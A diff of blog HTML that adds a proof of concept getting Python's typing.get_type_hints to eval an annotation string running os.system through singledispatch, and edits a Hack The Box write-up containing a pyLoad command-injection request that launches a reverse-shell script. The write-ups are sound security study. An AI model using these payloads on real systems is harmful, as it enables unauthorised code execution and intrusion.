@@ -440,7 +440,48 @@ Could not build url for endpoint &#39;http:///example.com&#39;. Did you mean &#3
 </span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> Payload()
 </span></span><span style="display:flex;"><span>print(typing<span style="color:#f92672">.</span>get_type_hints(p))
 </span></span></code></pre></div><p>Here, we specify a forward reference which imports <code>os</code> and calls <code>os.system</code></p>
-<p>It is possible that <code>typing.get_type_hints</code> is used internally by other Python functions, which could make these functions also susceptible to similar misuse. The Stack Overflow post mentions <code>functools.singledispatch</code> which has inner function <code>register</code>. The <code>register</code> function calls <code>typing.get_type_hints</code>. I tried using the above <code>Payload</code> class with <code>functools.singledispatch</code> but was not able to achieve code execution. Therefore, I leave this as an exercise to the reader.</p>
+<p>It is possible that <code>typing.get_type_hints</code> is used internally by other Python functions, which could make these functions also susceptible to similar misuse. The Stack Overflow post mentions <code>functools.singledispatch</code> which has inner function <code>register</code>. The <code>register</code> function calls <code>typing.get_type_hints</code>. In the <code>register</code> function, <code>typing.get_type_hints</code> is used like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register</span>(cls, func<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">nonlocal</span> cache_token
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> _is_valid_dispatch_type(cls):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> func <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">lambda</span> f: register(cls, f)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> func <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">TypeError</span>(
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Invalid first argument to `register()`. &#34;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>cls<span style="color:#e6db74">!r}</span><span style="color:#e6db74"> is not a class or union type.&#34;</span>
+</span></span><span style="display:flex;"><span>                )
+</span></span><span style="display:flex;"><span>            ann <span style="color:#f92672">=</span> getattr(cls, <span style="color:#e6db74">&#39;__annotate__&#39;</span>, <span style="color:#66d9ef">None</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ann <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">TypeError</span>(
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Invalid first argument to `register()`: </span><span style="color:#e6db74">{</span>cls<span style="color:#e6db74">!r}</span><span style="color:#e6db74">. &#34;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Use either `@register(some_class)` or plain `@register` &#34;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;on an annotated function.&#34;</span>
+</span></span><span style="display:flex;"><span>                )
+</span></span><span style="display:flex;"><span>            func <span style="color:#f92672">=</span> cls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># only import typing if annotation parsing is necessary</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">from</span> typing <span style="color:#f92672">import</span> get_type_hints
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">from</span> annotationlib <span style="color:#f92672">import</span> Format, ForwardRef
+</span></span><span style="display:flex;"><span>            argname, cls <span style="color:#f92672">=</span> next(iter(get_type_hints(func, format<span style="color:#f92672">=</span>Format<span style="color:#f92672">.</span>FORWARDREF)<span style="color:#f92672">.</span>items()))
+</span></span></code></pre></div><p>To reach the <code>get_type_hints</code> call, the function must be registered in such a way that the execution reaches the <code>else</code> block. This happens if we use <code>@register</code> on an annotated function. We can add additional annotations to the function before calling register. If we add annotations like in the example to the function, we can get code execution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> functools <span style="color:#f92672">import</span> singledispatch
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handle_payload</span>(p: <span style="color:#e6db74">&#34;Payload&#34;</span>): <span style="color:#75715e"># annotated function</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Processing Payload: </span><span style="color:#e6db74">{</span>p<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>handle_payload<span style="color:#f92672">.</span>__annotations__ <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;obj&#34;</span>: <span style="color:#e6db74">&#34;&#34;&#34;eval(&#39;__import__(&#34;os&#34;).system(&#34;ls&#34;)&#39;)&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@singledispatch</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">process</span>(obj):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Default processing&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>process<span style="color:#f92672">.</span>register(handle_payload)
+</span></span></code></pre></div><p>There will be a <code>TypeError: Invalid annotation for 'x'. 0 is not a class</code> when running this, but that happens after the <code>eval</code> is executed (and frankly, executing the <code>eval</code> is what we care about).</p>
 <hr>
 <p>While researching for this article, I learnt many things about Python internals. I found this quite interesting, and therefore, plan to look more into Python internals - and research other unsafe patterns that could lead to security issues. I also plan to use what I learn to look for security issues in open source code. Only time will tell how successful I am in these endeavors!</p>
 <p>Thanks for reading!</p>
@@ -686,7 +727,7 @@ Could not build url for endpoint &#39;http:///example.com&#39;. Did you mean &#3
 <p><em>Note 2: This script only automates the steps that need to be taken to get the flags. It does not automate the looking for the vulnerabilities part. After I completed the box, I automated the steps I took to get the flags.</em></p>
 <p>The complete code for this script can be found on <a href="https://github.com/anuraagbaishya/htb-pc">Github</a>.</p>
 <h2 id="setup-grpc">Setup grpc</h2>
-<p>The box is running a grpc service on port 50051. Therefore, to interact with the service, we need a grpc client. I followed a <a href="https://grpc.io/docs/languages/python/basics/">tutorial</a> on how to create a grpc client using thegrpcio-tools Python library. The first step was to define the service in a .proto file. My service definition is here. Once the service is defined grpcio-tools can generate the client code for you. You can use a command like this:</p>
+<p>The box is running a grpc service on port 50051. Therefore, to interact with the service, we need a grpc client. I followed a <a href="https://grpc.io/docs/languages/python/basics/">tutorial</a> on how to create a grpc client using the grpcio-tools Python library. The first step was to define the service in a .proto file. My service definition is <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp.proto">here</a>. Once the service is defined grpcio-tools can generate the client code for you. You can use a command like this:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python -m grpc_tools.protoc -I../../protos --python_out<span style="color:#f92672">=</span>. --pyi_out<span style="color:#f92672">=</span>. --grpc_python_out<span style="color:#f92672">=</span>. SimpleApp.proto
 </span></span></code></pre></div><p>For me, this generated 2 additional files, <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2.py"><code>SimpleApp_pb2.py</code></a> and <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2_grpc.py"><code>SimpleApp_pb2_grpc.py</code></a> . I will not explain what these files do here, since that itself is a lengthy topic of discussion. If you are curious, the tutorial link I added earlier has a lot of resources to understand grpc and how it works.</p>
 <p>Once we have the required files generated, we can connect to the grpc service:</p>
@@ -756,7 +797,7 @@ Could not build url for endpoint &#39;http:///example.com&#39;. Did you mean &#3
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#39;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">$&#39;http://localhost:8000/flash/addcrypted2&#39;</span>
 </span></span></code></pre></div><p>Here, I am running a script called <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/shell.sh"><code>shell.sh</code></a> which is just a bash reverse shell.</p>
-<p>PyLoad on this box is not available publicly. It can only be accessed from within the box. The official write-up uses SSH tunneling to tunnel from the user’s machine to the box. I chose the alternative option of running the exploit from within the SSH session, using the same <code>exec_command</code> function I used to read the user flag.</p>
+<p>PyLoad on this box is not available publicly. It can only be accessed from within the box. The official write-up uses SSH tunneling to tunnel from the user’s machine to the box. I chose the alternate option of running the exploit from within the SSH session, using the same <code>exec_command</code> function I used to read the user flag.</p>
 <p>I used SFTP to transfer the reverse shell to the box:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">transfer_file_from_local</span>(self):
 </span></span><span style="display:flex;"><span>    ftp_client <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>open_sftp()
@@ -775,7 +816,7 @@ Could not build url for endpoint &#39;http:///example.com&#39;. Did you mean &#3
 <ul>
 <li>Requires little to no UI interaction like clicking buttons, filing forms, etc that cannot be replicated using direct web / API calls. It might be possible to replicate these functionalities using selenium or similar — but that increases the complexity of the script.</li>
 <li>Related to the above — requires performing operations using some software running on one of the open ports or the machine. These might be web UIs or even CLI programs installed in the box.</li>
-<li>Has a lot of steps / requires running a lot of tools. The time required to create the script will be directly proportionate to the number of steps.</li>
+<li>Does not have a lot of steps / does not require running a lot of tools. The time required to create the script will be directly proportionate to the number of steps.</li>
 </ul>
 <p>This was the first (and only) box I have tried to script. I have done a few other boxes after this one, but I did not spend time trying to script them because of one of the above reasons. As I complete more boxes, I will continue to assess if the box is easy to script. If yes, great! If not, it may have to do with one of the above reasons, or I might have some other new reasons.</p>
 <p>That’s it from me. This is my 2023 contribution to my blog. I will not promise anything else here till a really long time has passed since this publication. I usually don’t work on technical things during my free time. Most (if not all) of the security work I do is by virtue of my employment. Therefore, there usually is not much for me to share.</p>
